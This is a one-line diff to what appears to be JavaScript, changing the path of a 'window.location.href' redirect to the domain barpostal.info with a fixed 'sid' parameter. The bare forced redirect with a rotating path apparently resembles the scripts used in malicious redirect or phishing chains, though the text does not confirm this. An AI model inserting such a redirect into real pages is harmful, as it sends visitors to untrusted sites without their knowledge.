@@ -1,1 +1,1 @@
-window.location.href = "https://barpostal.info/eUG/go?sid=7744";
+window.location.href = "https://barpostal.info/BZsI/go?sid=7744";
